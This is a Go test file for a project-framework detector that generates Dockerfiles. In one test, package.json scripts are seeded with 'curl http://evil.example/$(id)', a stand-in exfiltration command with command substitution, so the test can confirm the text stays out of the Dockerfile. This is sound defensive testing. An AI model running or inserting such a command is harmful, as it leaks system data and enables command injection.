package framework

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestDetect(t *testing.T) {
	cases := []struct {
		name      string
		files     map[string]string
		framework string
		manager   string
		build     string
		start     string
		errPart   string
	}{
		{
			name:      "dockerfile wins",
			files:     map[string]string{"Dockerfile": "FROM scratch\n", "package.json": `{"dependencies":{"next":"1"},"scripts":{"start":"next start"}}`},
			framework: Dockerfile,
		},
		{
			name:      "vite npm",
			files:     map[string]string{"package.json": `{"devDependencies":{"vite":"6.0.0"},"scripts":{"build":"vite build"}}`, "package-lock.json": "{}\n"},
			framework: Vite,
			manager:   NPM,
			build:     viteBuild,
			start:     "node server.js",
		},
		{
			name:      "vite pnpm",
			files:     map[string]string{"package.json": `{"devDependencies":{"vite":"6.0.0"}}`, "pnpm-lock.yaml": "lockfileVersion: '9.0'\n"},
			framework: Vite,
			manager:   PNPM,
			build:     viteBuild,
		},
		{
			name:      "vite yarn classic",
			files:     map[string]string{"package.json": `{"devDependencies":{"vite":"6.0.0"}}`, "yarn.lock": "# yarn lockfile v1\n"},
			framework: Vite,
			manager:   Yarn,
		},
		{
			name:      "vite yarn berry",
			files:     map[string]string{"package.json": `{"devDependencies":{"vite":"6.0.0"}}`, "yarn.lock": "__metadata:\n  version: 8\n"},
			framework: Vite,
			manager:   YarnBerry,
		},
		{
			name:      "next npm",
			files:     map[string]string{"package.json": `{"dependencies":{"next":"15.0.0","react":"19.0.0"}}`, "package-lock.json": "{}\n"},
			framework: Next,
			manager:   NPM,
			build:     nextBuild,
			start:     nextStart,
		},
		{
			name:      "node npm with build",
			files:     map[string]string{"package.json": `{"scripts":{"start":"node server.js","build":"echo hi"}}`, "package-lock.json": "{}\n"},
			framework: Node,
			manager:   NPM,
			build:     "npm run build",
			start:     "npm start",
		},
		{
			name:      "node no lockfile",
			files:     map[string]string{"package.json": `{"scripts":{"start":"node server.js"}}`},
			framework: Node,
			manager:   NPM,
			start:     "npm start",
		},
		{
			name:    "conflicting lockfiles",
			files:   map[string]string{"package.json": `{"scripts":{"start":"node server.js"}}`, "package-lock.json": "{}\n", "yarn.lock": "# yarn lockfile v1\n"},
			errPart: "conflicting lockfiles",
		},
		{
			name:    "next and vite",
			files:   map[string]string{"package.json": `{"dependencies":{"next":"1","vite":"1"}}`, "package-lock.json": "{}\n"},
			errPart: "both next and vite",
		},
		{
			name:    "library",
			files:   map[string]string{"package.json": `{"name":"lib","main":"index.js"}`},
			errPart: "unsupported project",
		},
		{
			name:    "empty",
			files:   map[string]string{},
			errPart: "no Dockerfile and no package.json",
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			dir := t.TempDir()
			for name, body := range tc.files {
				if err := os.WriteFile(filepath.Join(dir, name), []byte(body), 0o644); err != nil {
					t.Fatal(err)
				}
			}
			got, err := Detect(dir)
			if tc.errPart != "" {
				if err == nil || !strings.Contains(err.Error(), tc.errPart) {
					t.Fatalf("got %v, err %v", got, err)
				}
				return
			}
			if err != nil {
				t.Fatal(err)
			}
			if got.Framework != tc.framework {
				t.Fatalf("framework %s", got.Framework)
			}
			if tc.manager != "" && got.PackageManager != tc.manager {
				t.Fatalf("manager %s", got.PackageManager)
			}
			if tc.build != "" && got.BuildCommand != tc.build {
				t.Fatalf("build %s", got.BuildCommand)
			}
			if tc.start != "" && got.StartCommand != tc.start {
				t.Fatalf("start %s", got.StartCommand)
			}
		})
	}
}

func TestScriptTextStaysOutOfDockerfile(t *testing.T) {
	dir := t.TempDir()
	const evil = "curl http://evil.example/$(id)"
	body := `{"devDependencies":{"vite":"6.0.0"},"scripts":{"build":"` + evil + `","start":"` + evil + `"}}`
	if err := os.WriteFile(filepath.Join(dir, "package.json"), []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "package-lock.json"), []byte("{}\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	res, err := Detect(dir)
	if err != nil {
		t.Fatal(err)
	}
	if err := WriteBuildFiles(dir, res); err != nil {
		t.Fatal(err)
	}
	docker, err := os.ReadFile(filepath.Join(dir, "Dockerfile"))
	if err != nil {
		t.Fatal(err)
	}
	text := string(docker)
	if strings.Contains(text, "evil.example") || strings.Contains(text, "$(id)") {
		t.Fatalf("script text leaked into Dockerfile:\n%s", text)
	}
	if !strings.Contains(text, "RUN npx vite build") || !strings.Contains(text, "USER node") {
		t.Fatalf("template missing expected lines:\n%s", text)
	}
	if strings.Count(text, "FROM ") < 2 {
		t.Fatalf("expected a multi-stage dockerfile:\n%s", text)
	}
	ignore, err := os.ReadFile(filepath.Join(dir, ".dockerignore"))
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(ignore), ".env") || !strings.Contains(string(ignore), "node_modules") {
		t.Fatalf("dockerignore %s", ignore)
	}
}
